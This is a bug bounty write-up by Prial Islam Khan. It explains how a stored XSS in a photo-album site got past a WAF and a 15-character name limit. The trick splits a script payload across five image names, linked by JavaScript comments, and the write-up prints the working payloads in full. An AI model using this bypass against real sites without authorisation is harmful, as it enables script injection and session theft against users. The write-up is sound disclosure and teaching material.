---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-03-25_xss-waf-character-limitation-bypass-like-a-boss.md
original_filename: 2020-03-25_xss-waf-character-limitation-bypass-like-a-boss.md
title: XSS WAF & Character limitation bypass like a boss
category: documents
detected_topics:
- xss
- command-injection
- file-upload
tags:
- imported
- documents
- xss
- command-injection
- file-upload
language: en
raw_sha256: eca40ee528dbcf1ca3d6ab85b3a8953479726ac9c7a6a1ceb9f56c7a990864db
text_sha256: 939744c3f9d796e63bad6a631d6aefb5c66aa176593133080cb937272ea1d0ac
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: false
---

# XSS WAF & Character limitation bypass like a boss

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-03-25_xss-waf-character-limitation-bypass-like-a-boss.md
- Source Type: markdown
- Detected Topics: xss, command-injection, file-upload
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: False
- Raw SHA256: `eca40ee528dbcf1ca3d6ab85b3a8953479726ac9c7a6a1ceb9f56c7a990864db`
- Text SHA256: `939744c3f9d796e63bad6a631d6aefb5c66aa176593133080cb937272ea1d0ac`


## Content

---
title: "XSS WAF & Character limitation bypass like a boss"
url: "https://medium.com/bugbountywriteup/xss-waf-character-limitation-bypass-like-a-boss-2c788647c229"
authors: ["Prial Islam Khan (@prial261)"]
bugs: ["XSS"]
publication_date: "2020-03-25"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4693
scraped_via: "browseros"
---

# XSS WAF & Character limitation bypass like a boss

Top highlight

XSS WAF & Character limitation bypass like a boss
Prial Islam Khan
Follow
4 min read
·
Mar 27, 2020

912

6

H
ello Fellow Hackers!

I am sitting in my room for last 3 days due to corona virus outbreak world wide and feeling really bored . So I thought why not do a write-up what I promised really long ago 🤭. Few months back in My Tweet I shared a way to bypass XSS WAF & Character limitation what I found on a private bug bounty site. Today I will share more technical details about that bypass . Hope you guys will enjoy it 😇

Get Prial Islam Khan’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Back in 2019 I was testing a web application what allows a user to create a photo album and upload photos in it and the interface looks like below screenshot -

Press enter or click to view image in full size
Application Interface 🤔

Also there is option to rename images when I click on Edit , So normally any researcher will test for XSS here as there is a way to change the photo name . So I changed the photo name to below payload -

xsstest'">{{7*7}}

Then I noticed following things -

There is 15 character limitation in that input so I was able to inject xsstest'">{{7*7 these characters .
All special characters was being escaped properly .
And at last I was being redirected to /error.aspx?code=500 when I tried to load that album again due to WAF and I have to rename the image to xsstest then I was able to load the album again .

It looks like this input is well protected form XSS attacks . Then I start playing with other available options and connected Burp Suit tools with my browser and keep it open to capture all background requests in HTTP History . Then when I was going through HTTP History tab and one background request endpoint caught my attention what looks like https://subdomain.company.com/ajax/generateImageList.ashx?json={albums:[{"id":"<picture_ID>","value":"on"}]} . This request was for album Slideshow option and that endpoint page source was :-

<a href="https://image-link.com/image.jpg" title="xsstest" rel="lightbox[gallery]">84**00000</a>

Look at the title attribute value what is our image name in that album . So again I renamed my picture name to xsstest'">and again checked ajax/generateImageList.ashx page source and this time it was -

<a href="https://image-link.com/image.jpg" title="xsstest'">" rel="lightbox[gallery]">84**00000</a>

So in this new generateImageList.ashx endpoint -

Users input is not being escaped properly .
No WAF detection .

But we still have the 15 character limitation what makes this xss useless . The smallest xss payload we can think of for this scenario is "oncut="alert() Which will result a blank popup when we Press CTRL+X on Windows & COMMAND+X on OS X on keyboard :-

<a href="https://image-link.com/image.jpg" title=""oncut="alert()" rel="lightbox[gallery]">84**00000</a>
Press enter or click to view image in full size
Blank Popup 😪

I tried all possible way to bypass this character limitation and was unable to do it . I stopped testing here and saved about this endpoint in my To do list note to take a look here when I again test this asset . After about seven months I again started testing this asset and again working on this endpoint . Now noticed that I can upload multiple photos on album and by selecting all photos of album the Slideshow option request endpoint changes to https://subdomain.company.com/ajax/generateAlbumImageList.ashx?json={albums:[{"id":"<album_ID>","value":"on"}]} and that page source is :-

<a href="https://image-link.com/image.jpg" title="xsstest'">" rel="lightbox[gallery]">84**00000</a><a href="https://image-link.com/image.jpg" title="xsstest'">" rel="lightbox[gallery]">84**00001</a>

So now we have multiple injections here . So why not uplaod 5 pictures in the album and use My Tweet mentioned payload ?

Payload :

1st Injection: */</script><!--
2nd Injection: */.domain)/*xxx
3rd Injection:*/(document/*xx
4th Injection: */prompt/*xxxxx
5th Injection: "><script>/*xss

Page source after final injection become :-

<a href="https://image-link.com/image.jpg" title=""><script>/*xss" rel="lightbox[gallery]">84**00000</a><a href="https://image-link.com/image.jpg" title="*/prompt/*xxxxx" rel="lightbox[gallery]">84**00001</a><a href="https://image-link.com/image.jpg" title="*/(document/*xx" rel="lightbox[gallery]">84**00002</a><a href="https://image-link.com/image.jpg" title="*/.domain)/*xxx" rel="lightbox[gallery]">84**00003</a><a href="https://image-link.com/image.jpg" title="*/</script><!--" rel="lightbox[gallery]">84**00004</a>

Now visiting https://subdomain.company.com/ajax/generateAlbumImageList.ashx?json={albums:[{"id":"<album_ID>","value":"on"}]} will execute the payload we used :-

Press enter or click to view image in full size
Boom 😎🔥

Now you may have question why I used x character multiple time in 2nd to 5th payload ? The answer is in album images are sorting based on the name length + When it was uploaded . So I used x character multiple time to make all image name length same, so-that when I upload images it sort based on image upload time .

Hope you guys enjoyed this one . PM me at Twitter or Facebook anytime if you have any questions .

#Stay_Home
#Stay_Safe
#Wash_Your_Hand_Frequently
#Hack_The_Planet🔥

Follow Infosec Write-ups for more such awesome write-ups.

InfoSec Write-ups
A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub…

medium.com
